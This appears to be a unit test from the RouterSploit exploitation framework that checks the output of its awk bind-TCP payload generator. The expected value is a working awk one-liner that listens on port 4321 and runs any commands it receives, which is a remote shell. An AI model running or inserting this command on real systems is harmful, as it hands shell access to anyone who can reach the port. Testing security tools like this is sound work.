from routersploit.modules.payloads.cmd.awk_bind_tcp import Exploit


# awk bind tcp payload with rport=4321
bind_tcp = (
    "awk 'BEGIN{s=\"/inet/tcp/4321/0/0\";for(;s|&getline c;close(c))while(c|getline)print|&s;close(s)}'"
)


def test_payload_generation():
    """ Test scenario - payload generation """

    payload = Exploit()
    payload.rport = 4321

    assert payload.generate() == bind_tcp
